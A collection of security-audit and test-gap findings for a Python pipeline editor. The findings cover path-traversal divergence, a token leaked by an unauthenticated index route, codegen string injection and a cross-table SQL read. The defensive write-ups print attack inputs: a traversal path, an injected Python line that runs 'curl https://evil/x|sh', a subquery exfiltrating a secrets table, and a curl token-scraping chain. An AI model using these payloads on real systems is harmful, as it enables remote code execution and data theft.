security.description: `_normalise_path_text` unconditionally does `text.replace('\\','/')` on every platform before constructing the Path. This creates two problems. (A) Cross-platform divergence: on POSIX a backslash is a legal filename character, so the route guard `resolve_runtime_file_path` (which calls `_normalise_path_text`) interprets `..\..\etc\passwd` as the traversal `../../etc/passwd` (`..` IS in parts), whereas the executor's actual flat-file read guard `_io._validate_source_path` does `Path(path_string).parts` WITHOUT normalising backslashes, so on POSIX it sees a single literal filename `'..\..\etc\passwd'` with `..` NOT in parts and admits it. The two guards therefore disagree about the same string on POSIX, so reasoning about one does not bound the other. (B) Windows extended-length/device paths break: `\\?\C:\Windows\...` and `\\.\C:\...` become `/?/C:/Windows/...` / `/./C:/...`, which PureWindowsPath parses as RELATIVE (is_absolute()=False) with a literal `?` component, so resolve_runtime_file_path joins them UNDER the project root and `enforce_project_root=True` returns a silently-wrong in-root path instead of the intended absolute path. I verified all of this by direct execution.
security.exploit_scenario: On a Linux/macOS deployment, a shared pipeline graph carries a dataSource whose config.path contains backslashes. Whichever boundary the reviewer trusts to be authoritative (the enforce=True route guard vs the executor's `_validate_source_path`) interprets the path differently, so a path crafted to look benign to one layer is interpreted as traversal-or-literal by the other. Combined with the executor's enforce-default-False read path (prior finding #30), the divergence widens the set of strings whose containment outcome differs between validation and the actual read. The Windows `\\?\` case is primarily a correctness/robustness defect (the operator's intended absolute path silently becomes an in-root path), but it means containment decisions are made on a mangled path.
security.recommended_fix: Do not rewrite backslashes on POSIX. Gate the replacement on `os.name == 'nt'` (or use `os.sep`/`PureWindowsPath` only when running on Windows), and reject UNC/extended-length/device prefixes explicitly rather than mangling them. Make the route guard and `_io._validate_source_path` share a single normalisation+containment helper so the two boundaries can never interpret the same string differently.
security.boundary_note: Pure local-trust happy path is unaffected; the divergence and parse corruption only bite once a path string is attacker-influenced (shared/imported pipeline) and especially on POSIX.

security.title: is_relative_to containment is case-sensitive on POSIX but macOS/APFS is case-insensitive, so case-variant paths in a shared pipeline can bypass containment on macOS
security.description: All three containment primitives gate on `resolved.is_relative_to(root)`. `pathlib.PurePosixPath.is_relative_to` is case-SENSITIVE (verified: `PurePosixPath('/PROJ/secret').is_relative_to('/proj')` is False), while `PureWindowsPath.is_relative_to` is case-insensitive. On Windows, `Path.resolve()` also canonicalises case to the real on-disk casing (verified), so case games do not help an attacker there. On macOS, however, the default APFS volume is case-INSENSITIVE while Python treats paths with POSIX (case-sensitive) semantics, and `os.path.realpath` on macOS does not correct the case of existing components. The net effect is that on macOS two strings that the filesystem treats as the same location can compare as different under `is_relative_to`. Depending on how the project root string was captured (its casing) versus the casing of a crafted candidate, a containment check can yield a result that does not match the filesystem's actual notion of inside/outside, undermining the invariant that `is_relative_to(root)` means 'the same subtree the OS will open'. I could not execute the macOS-specific case-fold behaviour on this Windows host, hence low confidence; the POSIX case-sensitivity of is_relative_to is verified.
security.exploit_scenario: A pipeline is authored/imported on a case-insensitive macOS install. The project root is recorded as `/Users/op/Proj`. A shared graph references a file whose path is spelled with a different case for the root prefix (e.g. `/users/op/proj_secret/leak.csv` or a casing that makes `is_relative_to` of a sibling directory like `/Users/op/ProjEvil` compare inside/outside incorrectly). Because the FS resolves casings loosely but the containment check compares case-sensitively, the validated decision can diverge from what the OS actually opens, letting a path the operator believes is contained resolve to a different real location (or vice-versa, breaking a legitimate path).
security.recommended_fix: Do not rely on `is_relative_to` string comparison as the security boundary on case-insensitive filesystems. Compare using `os.path.commonpath` on `os.path.normcase`-folded, fully-realpath'd paths, or canonicalise both root and candidate through `os.path.realpath` + `os.path.normcase` before the prefix check, so the comparison matches the host filesystem's case semantics on every platform. Add a macOS CI matrix entry that asserts a case-variant out-of-root path is rejected.
security.boundary_note: Cross-platform robustness gap that only matters once paths are attacker-influenced AND the host FS is case-insensitive (macOS default, some Windows network shares); solid on case-sensitive Linux and on Windows (where resolve() folds case).

security.title: Project-root sandbox is silently whatever cwd `haute serve` was launched from; set_project_root is never called in production, so the containment scope follows the launch directory
security.location: src/haute/_sandbox.py:43-57 (_PROJECT_ROOT / _get_project_root / set_project_root); src/haute/cli/_serve.py:443-506 (uvicorn.run with no chdir / no set_project_root); consumers: routes/pipeline.py:383 (validate_safe_path(_get_project_root(),...)), _sandbox.safe_unpickle/safe_joblib_load:423,443
security.description: `_get_project_root()` lazily caches `Path.cwd().resolve()` on first access and is the root for `validate_project_path` (safe_unpickle/safe_joblib_load), `validate_safe_path` (the file-browser route), and the inferred root in `resolve_runtime_file_path` when no project_root is supplied. `set_project_root` exists to pin this explicitly, but a full-tree grep shows it is called ONLY from tests/CLI-doc intent and NEVER from any production entry point: `haute serve` (cli/_serve.py) launches `uvicorn.run('haute.server:app', ...)` with no chdir and no `set_project_root`. Consequently the entire path-containment boundary is defined implicitly by the directory the operator happened to be in when they started the server. If `haute serve` is run from a broad directory (the user's home directory, or a drive root such as `C:\` / `/`), the 'project root' becomes that whole subtree and containment degrades toward a no-op; the file-browser route and unpickle path validation then permit traversal anywhere under that broad root.
security.exploit_scenario: An operator starts `haute serve` from their home directory (a common convenience) rather than from a tight project folder. `_get_project_root()` caches `~`. A shared pipeline or a request to the file-browser/preview endpoints can now reference any file anywhere under `~` (SSH keys, browser profiles, other projects' secrets) and pass every containment check, because they are all 'inside the project root'. Because there is no explicit, narrow project root tied to `haute.toml`'s location, the security scope silently tracks the launch cwd rather than the project, and nothing warns the operator that the boundary just expanded.
security.recommended_fix: Pin the project root explicitly at server startup from the resolved location of `haute.toml` (the same anchor `pipeline_dir()` already uses) by calling `set_project_root(haute_toml_dir)` in `handle_serve`/app startup, instead of falling through to `Path.cwd()`. Fail loudly (or emit a structured warning) if the resolved root is a filesystem root or the user home directory. This narrows containment to the actual project regardless of launch cwd and removes the silent dependency on where the process was started.
security.boundary_note: Adequate for the disciplined trusted-operator who always launches from a tight project dir; becomes a real over-broadening of the sandbox the moment the operator launches from home/root or relies on the boundary while browsing/importing shared content.

security.location: src/haute/server.py:707-730 (serve_spa + _serve_index_html); gate-bypass roots at src/haute/_local_security.py:173 (LocalSessionMiddleware only guards paths under /api/) and src/haute/server.py:709-710 (token embedded in HTML)
security.title: SPA index route serves the live session token to any client without Origin or token authentication, escalating the documented 'leakable secret' into turnkey unauthenticated token disclosure once bound non-loopback
security.description: The whole local-auth design rests on a single per-process secret: every /api/* route and the /ws/sync WebSocket require the session token (LocalSessionMiddleware._token_matches / websocket_rejection_reason). But the token is itself dispensed, with NO authentication, by the SPA catch-all. _serve_index_html() (server.py:707-719) embeds the live token verbatim as `<script>window.__HAUTE_SESSION_TOKEN__ = "<token>"</script>`, and serve_spa (server.py:721-730) returns that HTML for `/` and EVERY non-file, non-/api path. LocalSessionMiddleware.dispatch (_local_security.py:173) short-circuits (`return await call_next(request)`) for any path that does not start with `/api/`, BEFORE the Origin check and BEFORE the token check. So the index route applies neither gate. The only filter in front of it is LocalTrustedHostMiddleware (the Host header). I confirmed end-to-end with a Starlette TestClient: `GET /` (and `GET /any/spa/route`) with a valid Host (`localhost`/`127.0.0.1`), a FOREIGN Origin, and NO session token returns 200 with the token in the body, while `GET /api/session` without the token returns 403 — the protection is asymmetric (the API is gated; the thing that hands out the API's key is not). This is distinct from the already-catalogued findings: catalog #747 covers the token being accepted as a WS query param and absent-Origin being trusted (i.e. how a token, once known, can be replayed and how a leaked URL leaks it); the existing serve_spa finding (B041) is only about symlinked-install path resolution. Neither notes that the index route HANDS OUT the token with no auth. Additionally, because the token is inlined into HTML, any future same-origin XSS or a browser extension reading window.__HAUTE_SESSION_TOKEN__ obtains the full credential, and an intermediary/forward proxy in front of an exposed instance could cache the token-bearing HTML for other clients (the response sets Cache-Control: no-store, which mitigates shared-cache reuse but not proxy logging or a misbehaving cache).
security.exploit_scenario: The operator follows a supported path and runs `haute serve --host 0.0.0.0` (or `--host <LAN-IP>`) to reach the editor from another device — the CLI prints an exposure warning but proceeds. _trusted_hosts_for_bind('0.0.0.0') returns '*', so LocalTrustedHostMiddleware.allow_any is True and accepts ANY Host (verified: `_trusted_hosts_for_bind('0.0.0.0') == '*'`; with HAUTE_TRUSTED_HOSTS='*', `GET /` with an arbitrary Host `victim-laptop.lan`, a foreign Origin and no token returns 200 with the token in the body). A second machine on the same network (a co-worker's laptop, a compromised IoT device, a guest on the office Wi-Fi) does `curl http://<victim-ip>:8000/`, scrapes `window.__HAUTE_SESSION_TOKEN__` from the returned HTML — no auth, no Origin, no prior knowledge — and now holds the sole credential. It replays the token in the x-haute-session-token header against /api/* (and/or the ?haute_session_token= WS query param) to create/edit/run pipelines, which execute attacker-authored Python in-process and write files (full RCE on the operator's machine). For a specific-IP bind the chain is identical: trusted hosts include that IP, so `Host: <LAN-IP>` passes. This converts catalog #747 from 'the secret can leak via logs/referrer' into 'the server gives the secret to anyone who can open a TCP socket', removing the need for any incidental leak. (At the DEFAULT loopback bind the same code path still serves the token ungated, but SOP/CORS stop a remote browser from reading the cross-origin body and loopback-only binding stops a remote socket — so default config is defense-in-depth-weak rather than remotely exploitable.)
security.recommended_fix: Do not dispense the session token from an unauthenticated endpoint. Preferred: stop embedding the token in HTML entirely and instead set it as an HttpOnly, SameSite=Strict, Secure-where-applicable cookie scoped to the loopback host, issued only on a request that already proves locality, and have the frontend send it back automatically (cookie) or fetch it from a token endpoint that is itself behind the Origin+token gate. If the inline-bootstrap approach must stay, gate the index route exactly like /api/*: when local_session_auth_disabled() is False, require _is_local_origin(request.headers) for the document request AND only inline the token when the request demonstrably originates from the local UI (e.g. require the Origin/Referer to be local AND that the connection is loopback), returning the shell WITHOUT the token otherwise (the SPA can then obtain it via an authenticated channel). At minimum, refuse to inline the token whenever the effective trusted-host configuration is wildcard ('*') or the bind is non-loopback, and add a regression test asserting that `GET /` with a foreign Origin / from a non-loopback peer does NOT contain window.__HAUTE_SESSION_TOKEN__. Independently, reconsider defaulting `--host 0.0.0.0` to wildcard trusted hosts (it disables the Host gate, the only remaining filter in front of the token-bearing page).

security.title: Submodel name / file field code-injected into emitted pipeline.submodel("...") call via bare-quote f-string (no _safe_path/_safe_str)
security.description:
When a graph contains submodels, graph_to_code_multi emits the main file's submodel import lines as:

    sm_path = sm_meta.get("file", f"modules/{sm_name}.py").replace("\\", "/")
    sm_imports.append(f'pipeline.submodel("{sm_path}")')

sm_path is interpolated into the generated Python with bare double-quotes and NO escaping. Its value is fully attacker-controlled in the shared/imported-pipeline trust model: it is either submodels[name]["file"] (an arbitrary string on the PipelineGraph) or, when "file" is absent, the default f"modules/{sm_name}.py" built from the submodel dict KEY (also arbitrary). Both are accepted verbatim by the Pydantic model (submodels: dict[str, Any]) with no charset constraint.

This is the exact bare-f-string-with-bare-quotes class the codebase already fixed elsewhere: connect() ports were hardened with json.dumps after the adversarial review's "C2" finding (codegen.py:776-794), every user string goes through _safe_str / _safe_path / _sanitize_description, instance of="..." and connect("a","b") use codegen-derived *sanitized identifiers* (safe). The submodel import line is the one place an arbitrary (non-sanitized) string is dropped into code position behind bare quotes — it was missed.

Critically, the final emission gate _assert_emitted_files_parse (codegen.py:819-843, runs ast.parse on every file) does NOT stop this, because the payload is crafted to be syntactically valid Python: the breakout closes the string, adds a real expression, and comments out the trailing ")  with a #. The contrast is intentional in the code's own comments at line 776 ('bare f-string interpolation breaks on label = a"b') — yet that lesson was not applied here.

Verified empirically against the real graph_to_code_multi (uv run): with submodels={'mod1': {'file': 'modules/m.py") or __import__("os").system("echo PWNED")  #', ...}} the emitted main.py line is:

    pipeline.submodel("modules/m.py") or __import__("os").system("echo PWNED")  #")

ast.parse succeeds (PARSES_OK: True). The submodel-NAME vector (no explicit 'file') reproduces identically via the default modules/<name>.py path. Note _safe_path's backslash->slash normalisation does not help: the payload uses no backslashes and the double-quote it contains is never escaped.
security.exploit_scenario: A user imports / opens a shared pipeline (a PipelineGraph JSON, an exported project, a teammate's pipeline) whose submodels map carries a crafted name or file field, e.g. file = 'modules/m.py") or __import__("os").system("curl https://evil/x|sh")  #'. The moment that graph is round-tripped through codegen — on save (routes/_save_pipeline.py:518 calls graph_to_code_multi and writes the result) or on any deploy/bundle path that regenerates source — the emitted main.py contains a module-level expression that runs the attacker command. main.py is in the save-route output allowlist (it matches source_file), so it IS written to disk; the per-file output-path check (_validate_output_rel_path) only constrains the *filename* of module outputs, never the file *content*, and _validate_unique_sanitized_names only checks node labels, not submodel names/files — so nothing upstream neutralises this. The payload then executes when the saved pipeline is loaded/run (the normal next step after a save), achieving arbitrary code execution on the operator's machine (or the CI/deploy host) from nothing more than opening or deploying a shared pipeline. This breaks precisely the boundary the trust model calls out: 'what breaks if pipeline source/config is attacker-influenced (a shared pipeline, an imported submodel).'
security.recommended_fix:
Emit the path through the existing literal helper instead of bare quotes — change line 1241 to use _safe_path:

    sm_imports.append(f'pipeline.submodel({_safe_path(sm_path)})')

(_safe_path is already imported in codegen.py and escapes backslashes, quotes, and newlines.) This makes the value a proper Python string literal that cannot break out, exactly like connect()'s json.dumps fix and every other string emission. Additionally (defence in depth, separate from this line) consider validating submodel names/file fields at the model/save boundary the same way node labels are validated, so a submodel name that is not a safe identifier and a file that is not a clean modules/<sanitized>.py path are rejected before codegen rather than relied upon to be sanitized only on the happy-path UI route (_submodel_ops.py:38).
security.recommended_fix_note: A failing test should assert that graph_to_code_multi with a submodel file/name containing a double-quote either escapes it (round-trips as a literal) — i.e. the emitted pipeline.submodel argument ast-parses to a single Constant string equal to sm_path — covering both the explicit-file and default-name vectors.

security.location: src/haute/_databricks_io.py:63-84 (_validate_select_clause) and :303-308 (sql_query = f"{select_clause} FROM {table}"); reachable via src/haute/routes/databricks.py:150-180 (POST /api/databricks/fetch, body.query) and src/haute/_codegen_builders.py:318-327 (query={query!r} round-tripped through @pipeline.data_source)
security.title: Databricks SELECT-clause validator is a keyword denylist that does NOT constrain which tables a query reads — a shared pipeline's `query` field can exfiltrate any table the operator's token can reach (the table-name allowlist is a false guarantee)
security.description: fetch_and_cache builds `sql_query = f"{select_clause} FROM {table}"` where `table` is tightly allowlisted by `_TABLE_NAME_RE` (catalog.schema.table) but `select_clause` is attacker-controlled free text only passed through `_validate_select_clause`. That validator is a pure denylist: it requires a leading SELECT, forbids `;`, `--`, `/*`, and the keywords DROP/DELETE/INSERT/UPDATE/ALTER/TRUNCATE/EXEC/EXECUTE/CREATE/GRANT/REVOKE/UNION/LATERAL. It performs NO restriction on which tables the SELECT body references. A read-only SELECT that embeds a scalar/correlated subquery in its projection list reads an entirely different table than the allowlisted FROM target, and the assembled statement is valid Databricks SQL. The catalog.schema.table allowlist therefore creates a false sense that 'fetch can only read the named table'; the `query` field defeats it. The exfiltrated data is written to the local parquet cache (.haute_cache/) and is subsequently readable through GET /api/schema/databricks and the pipeline executor. Note SSRF is NOT a concern here: `server_hostname` is pinned to the operator's DATABRICKS_HOST env var, so the connection target host cannot be redirected; the issue is read-scope, not host control. I verified the bypass: validate(query) passes and the final SQL is well-formed for: query="SELECT *, (SELECT max(token) FROM admin_secrets.kv.api_tokens) AS leaked", table="myteam.analytics.policies" -> "SELECT *, (SELECT max(token) FROM admin_secrets.kv.api_tokens) AS leaked FROM myteam.analytics.policies". This is distinct from the two existing exhaustive findings on _validate_select_clause, which only flag it OVER-blocking legitimate keywords-as-data (a usability bug); none flag the UNDER-restriction / cross-table-read security gap.
security.exploit_scenario: A teammate shares (or an importer imports) a pipeline .py whose Databricks data-source node carries config like `@pipeline.data_source(table="shared.demo.policies", http_path="/sql/1.0/warehouses/abc", query="SELECT *, (SELECT collect_list(secret) FROM finance.pii.salaries) AS x")`. The table passes _TABLE_NAME_RE and looks benign; the operator opens the pipeline and clicks 'Fetch Data', which POSTs {table, http_path, query} to /api/databricks/fetch. _validate_select_clause accepts the query (no banned keyword, no comment, no semicolon), and the connector runs it against the operator's own Databricks workspace/token. Rows from finance.pii.salaries — a table the shared pipeline was never granted in its visible FROM — are materialised into the local parquet cache and exposed via the schema-preview endpoint and any pipeline run reading that source. The allowlist gave the reviewer false confidence that only shared.demo.policies could be read.
security.recommended_fix: Stop relying on a keyword denylist over free-form SQL. Preferred: drop the arbitrary `query` field for the fetch path and build the statement from structured, validated parts only — e.g. an explicit allowlisted column list plus an optional WHERE built from parameterised predicates, with every table reference forced to equal the allowlisted `table` (reject any query whose parsed table set is not exactly {table}). If a free-form projection must be retained, parse the query with a real SQL parser (e.g. sqlglot) and (a) assert it is a single read-only SELECT, (b) enumerate ALL table references (including subqueries/CTEs) and reject anything other than the single allowlisted `table`, and (c) reject subqueries/derived tables entirely if cross-table reads are unwanted. Also quote/normalise the interpolated `table` consistently (the optional-backtick acceptance in _TABLE_NAME_RE means quoting is asymmetric — see the existing cache-fragmentation finding). Per CLAUDE.md, first add a failing test asserting that a fetch whose query references a table other than the allowlisted one is rejected (not cached). Keep the existing fail-loud ValueError but route it to a 400 at the route (the route currently turns these ValueErrors into an opaque 500 — see exhaustive finding on fetch_databricks_table lacking _validate_table_param).

tests.title: Azure YAML structural test parses only the header (splits off everything from `stages:`), so it cannot catch the production-deploy indentation bug (V017/V018)
tests.description: The sole structural-parse test for `azure_devops_yml` does `raw.split("\nstages:")[0] + "\nstages: []"` and only `yaml.safe_load`s the truncated header, discarding the ENTIRE stages body. The analogous GitLab test (`test_yaml_parses`, lines 862-866) parses the FULL document for every target via `yaml.safe_load(gitlab_ci_yml(target))`. The Azure equivalent was deliberately weakened to header-only, creating a coverage hole precisely over the broken region: the DeployProduction `env:` secrets block is under-indented (14 spaces under an 18-space `env:`), producing invalid YAML. Because the test throws the body away, CI is green while every emitted `.azure-pipelines.yml` is structurally invalid. This is the verified bug V017/V018.
tests.evidence: Executed (.venv python): header-only parse of azure_devops_yml('databricks') => OK (isinstance dict=True); full-document yaml.safe_load(azure_devops_yml('databricks')) => yaml.scanner.ScannerError: mapping values are not allowed here, line 194 '- script: |'. The weak test passes today; a full parse loop (what GitLab does) would fail for the targets, exposing the malformed DeployProduction env: block.
tests.recommended_fix: Replace the header-only test with a full-document parse loop mirroring the GitLab test: `for target in TARGETS: assert isinstance(yaml.safe_load(azure_devops_yml(target)), dict)`. This must be added/fixed ALONGSIDE the V017 source fix (depth-aware secrets indentation) — the test currently codifies a coverage hole and would otherwise keep the production bug invisible.

tests.title: No codegen test exercises a constant ENTRY with empty/missing name or None value, hiding the codegen<->executor divergence (V020) and the AttributeError crash (V021)
tests.description: The only constant-codegen tests cover an empty or None `values` LIST (the `{"constant": [0]}` default) and well-formed entries (`{"name": "rate", "value": "0.05"}`). They never test an individual entry with an empty/missing `name`, `name=None`, or `value=None`. Two verified bugs live exactly in that gap: (V021) `_gen_constant` calls `float(val)` then `_safe_str(val)` which does `None.replace(...)`, crashing for `value=None` even though the executor `_build_constant` tolerates it (`{name: [None]}`); (V020) for an empty/missing name `_gen_constant` emits a real column with default name (now `""`), while the executor `_build_constant` does `if not name: continue` and the column-contract `_constant_columns` keeps only truthy names — so a graph that runs in-canvas produces a different column set when saved/deployed. A user building a constant node with a blank row or a null value silently gets divergent generated code or a hard save/deploy crash, with no test guarding it.
tests.evidence: Executed (.venv python, _node_to_code): entry {name:'x', value:None} => raises AttributeError: 'NoneType' object has no attribute 'replace' (V021). entry {name:'', value:5} => codegen emits `return pl.LazyFrame({"": [5.0]})` AND decorator `contract={..."outputs": ['constant']}` — body column `""` vs executor/contract column `constant` (V020). src/haute/_codegen_builders.py:583-596 vs src/haute/_builders.py:604-628 confirm the divergence in source.
tests.recommended_fix: Add codegen tests (TDD, RED before the V020/V021 fix) asserting: (1) a constant node with an entry `{name:'x', value:None}` generates compilable code whose constant column equals the executor's (`[None]`), not a crash; (2) a constant node with an empty/missing-name entry produces the SAME column set the executor produces (entry skipped; `{"constant": [0]}` when all names empty) and a matching outputs contract. Cross-check generated `data_dict` against `_build_constant`'s runtime output for the same config.

tests.location: tests/test_rating_key_agreement.py:165-175 (test_string_keys_are_verbatim_never_collapsed) + :326-347 (test_legacy_compact_float_key_migrates_on_load); whole file lacks a string-label compact->expand round-trip
tests.title: No test pins compact->expand of a STRING factor label like "25.0"; the suite codifies the read-side migration as always-correct while the verified write/read asymmetry (V038) silently corrupts string labels
tests.description: The suite thoroughly covers numeric keys (`{"age": 25.0}` collapses to `"25"`) and the legacy read-side migration (`{"25.0": ...}` -> `"25"`), but never asserts that a row-array entry whose factor value is the STRING label `"25.0"` survives a fresh `compact_rating_step_config_for_sidecar` -> `expand_rating_step_config_from_sidecar` round trip. That is exactly the V038 bug: the write side (`_canonical_sidecar_key` -> `normalise_rating_key`) keeps string labels verbatim (`"25.0"`), so the compact map key is `"25.0"`; the read side (`_normalise_compact_sidecar_key`) then migrates `"25.0"` -> `"25"`. So a legitimate non-numeric band label `"25.0"` is silently rewritten after one save/load cycle. `test_legacy_compact_float_key_migrates_on_load` pins the migration as intended without distinguishing a true legacy float-key from a user's verbatim string label, effectively blessing the lossy behaviour. The matching read/write-collision case (V039: two labels differing only in float formatting written without a duplicate error but rejected on read) is also untested.
tests.evidence: Executed (.venv python): config entries=[{"age":"25.0","value":2.0}] => compact entries {'25.0': 2.0} => expand entries [{'age':'25','value':2.0}] ; LABEL PRESERVED? False. Source: src/haute/_rating_step_config.py:44-58 (write, verbatim) vs :61-79 (read, migrates int-like float-strings) and :225 walk() applying _normalise_compact_sidecar_key.
tests.recommended_fix: Add a RED test (alongside the V038/V039 fix) asserting a STRING factor label `"25.0"` round-trips compact->expand unchanged (or that the system fails loudly rather than silently collapsing it), and a test that two string labels differing only in float formatting (e.g. '5.' and '5') raise a duplicate on the WRITE side, symmetric with the read-side collision the suite already checks. Make the existing `test_legacy_compact_float_key_migrates_on_load` explicit that it targets legacy float keys, not user string labels.

tests.location: tests/test_fingerprint_cache.py:379-387 (TestGraphFingerprint.test_extra_keys_affect_fingerprint) — and the whole TestGraphFingerprint class
tests.title: graph_fingerprint tests never check injectivity of the extra_keys/context join; distinct cache contexts collide (V035) with no guarding test
tests.description: `TestGraphFingerprint` checks same-graph equality, different-node inequality, and that adding ONE extra key changes the fingerprint, but never probes the injectivity boundary the verified bug V035 concerns: `graph_fingerprint` joins `[*extra_keys, *context_parts, base]` with `"\n".join(...)`, which is NOT injective when an extra_key (or context part) contains a newline. Two semantically different cache contexts therefore produce an identical fingerprint, poisoning the cache (one request's result served for a structurally different one). No test in the suite (`test_fingerprint_cache.py`, `test_graph_fingerprint_cached.py`, `test_caching_correctness.py`) exercises a separator-bearing key.
tests.evidence: Executed (.venv python, haute._cache.graph_fingerprint): graph_fingerprint(g, 'a\nb') == graph_fingerprint(g, 'a', 'b') => both v5:7a01570ba0435ca9; COLLISION? True. (The node-id newline variant did NOT collide here, so the proven, scoped gap is the extra_keys/context join at src/haute/_cache.py:429-432.)
tests.recommended_fix: Add a test asserting `graph_fingerprint(g, 'a\nb') != graph_fingerprint(g, 'a', 'b')` (and a pipe/control-char variant), failing today, paired with the V035 fix that frames the join with canonical_json so each component is length-delimited and the encoding is injective.

tests.location: tests/test_caching_correctness.py (no _sort_key/NaN-set determinism test); tests/test_serialization_invariants.py (uses NaN values but not in sets)
tests.title: No test pins canonical_json order-independence for sets/frozensets containing NaN; the documented contract is silently violated (V034)
tests.description: canonical_json documents (module docstring + _canonicalise docstring) that unordered containers (set/frozenset) encode identically regardless of insertion order because they are sorted by `_sort_key`. That guarantee breaks when a set contains two or more NaN floats: `_sort_key` maps every float (NaN included) to ('2_num', value), and because all NaN comparisons are False, `sorted` cannot impose a total order and leaves the NaNs in hash/insertion order. Two logically-equal NaN-containing sets then canonicalise to different byte strings, so any cache key derived from such a value is non-deterministic. No test exercises a set/frozenset with NaN through canonical_json.
tests.evidence: Executed (.venv python, haute._cache.canonical_json): canonical_json(frozenset({nan,1.0,nan})) => '[NaN,1.0,NaN]' vs canonical_json(frozenset([1.0,nan,nan])) => '[1.0,NaN,NaN]'; stable across two equal NaN-sets? False. Source: src/haute/_cache.py _sort_key (~163-188) and the set branch (~137-147).
tests.recommended_fix: Add a determinism test asserting `canonical_json(set_a) == canonical_json(set_b)` for two equal NaN/inf-containing frozensets built in different orders (RED today), paired with the V034 fix that gives non-finite floats a stable, total secondary sort key.

tests.title: Cross-boundary submodel edge tests only cover single-submodel<->parent; the two-different-submodels child->child case (V041) is untested and the property suite explicitly budgets the bug out as accepted
tests.description: `TestMergeSubmodelsCrossBoundaryEdges` exercises reconstruction/rewiring of edges between ONE submodel's child and a main-file parent node (load->child_a, child_b->output), including dedup and membership guards. None of these reach the verified V041 case: a direct edge from an OUTPUT child of submodel A to an INPUT child of submodel B. There `rewire_edges` runs once per submodel; submodel A's pass rebuilds `submodel__A -> b_in` with sourceHandle='out__a_out', then submodel B's pass sees tgt_inside and clobbers it to `submodel__A -> submodel__B` WITHOUT preserving the sourceHandle — the boundary handle is lost (dropped on flatten, breaks codegen on re-save). The codegen roundtrip property test `test_submodel_container_types_are_explicitly_budgeted` documents this exact limitation ('drops user-facing cross-boundary source handles', 'a product limitation to fix') and pins NodeType.SUBMODEL out of the byte-idempotence property — i.e. the suite accepts the broken behaviour as known rather than asserting the correct (handle-preserving) outcome.
tests.evidence: Source: src/haute/_submodel_graph.py rewire_edges target-side branch does not pass sourceHandle (per VERIFIED-BUGS V041); tests/test_parser_submodels.py cross-boundary cases all use `{"sub": child}` (a single submodel). tests/test_codegen_roundtrip_property.py:707-717 docstring explicitly states the submodel parser 'drops user-facing cross-boundary source handles' and budgets it out.
tests.recommended_fix: Add a merge_submodels test with TWO submodels A and B and a parent_edges entry connecting a child of A directly to a child of B, asserting the rewired edge is `submodel__A -> submodel__B` with BOTH sourceHandle='out__a_out' AND targetHandle='in__b_in' preserved (and survives a flatten/codegen round trip). This is RED today and must land with the V041 fix; it also converts the property-test's 'known limitation' note into an enforced invariant.

tests.location: tests/test_codegen_docstring_roundtrip.py:36-40, 233-234, 559-569, 612-614 (module/class docstrings) vs the unmarked test bodies at :235-263, :559-614
tests.title: Docstring-roundtrip tests claim to be xfail(strict=True) / 'fails today' but carry no xfail marker and pass — misleading test documentation that obscures whether the invariant is actually enforced
tests.description: The module docstring (lines 36-40) and several method/class docstrings assert these round-trip cases are 'marked pytest.mark.xfail(strict=True)' and 'fail today ... post-fix this must pass and the xfail marker must be removed' (e.g. test_triple_quote_content_roundtrips, test_empty_description_roundtrips, TestTortureEndToEnd.test_submodel_nested_torture_roundtrip at :612-614). In reality the Wave 9D fix landed (src/haute/_codegen_builders._sanitize_description docstring at :144-145 states `ast.get_docstring(fn) == desc` now holds), the markers were correctly removed, and the tests PASS. The prose is stale and now lies about the suite's state. This is not a correctness defect (the tests assert the fixed, correct behaviour), but it materially misleads a reader about which invariants are enforced vs aspirational, which is a maintenance hazard in a suite that elsewhere relies on strict-xfail bookkeeping.
tests.evidence: Executed (.venv python -m pytest): test_triple_quote_content_roundtrips, test_empty_description_roundtrips, TestTortureEndToEnd::test_submodel_nested_torture_roundtrip => '3 passed'. No `@pytest.mark.xfail` decorator exists on any of these methods. src/haute/_codegen_builders.py:131-167 confirms the sanitiser now guarantees the round-trip the docstrings call broken.
tests.recommended_fix: Update the module and method docstrings to remove the stale 'xfail(strict=True) / fails today' language and state the invariant is now enforced (the sanitiser guarantees ast.get_docstring == description). No behavioural change to the assertions is needed.

tests.title: No test previews a MULTI-PORT apiInput source node itself, leaving verified bugs V011 + V014 (empty output_columns shadows first-port fallback) completely uncovered
tests.description: The multi-port runtime suite is the only place that exercises 2+ emit-true apiInput tables, but every assertion is on a DOWNSTREAM consumer node (target_node_id="d_policies"/"d_drivers"/"c_policies"/"c_drivers"). The source node 'api' is only ever previewed with a SINGLE-port config (target_node_id="api" appears at lines 149, 248, 337, 438, 447 — all using _single_port_config). The source node's OWN preview when it emits dict[port,DataFrame] is never asserted. That is precisely the code path of two confirmed bugs: V011 (executor.py:1131-1137 _column_infos_for_node: full_output=output_cols.get(node_id) returns the hard-set [] from _execute_lazy.py:1903-1904, and because `[] is not None`, columns=[] and the `elif df is not None` first-port fallback is never reached → the multi-port source reports ZERO columns in its own preview) and V014 (executor.py:1102-1107 _cached_output_names: cached=[] is falsy, falls through to df=eager_outputs.get(node_id) which is a dict, then set(dict.columns) → AttributeError for any instanceOf schema-warning path with a multi-port parent).
tests.evidence: Grep of tests for target_node_id="api" with multi-port: the only 5 hits are all _single_port_config. _execute_lazy.py:1903-1904 hard-sets available_columns[nid]=[] / output_columns[nid]=[] for the multi-port branch; executor.py:1132 `if full_output is not None:` treats the empty list as authoritative. No test asserts results["api"].columns or column_count for a 2-port config, and no test wires a multi-port apiInput into an instanceOf node (the _cached_output_names path).
tests.recommended_fix: Add a test that runs execute_graph(graph, target_node_id="api") with _multi_port_config and asserts the source's own preview exposes a non-empty representative column set (e.g. the first/'policies' port's {policy_id}) and column_count>0 — this fails today (columns==[]) and pins V011. Add a second test wiring a multi-port apiInput as a parent of an instanceOf node so _cached_output_names is exercised; assert no AttributeError and a sensible union-of-ports schema-warning set — pins V014.

tests.title: No test covers V029: the FIRST in-flight reservation is refused when one profile's LIMIT alone exceeds (available_ram - os_reserve); every admission test sizes RAM so the first reservation always fits
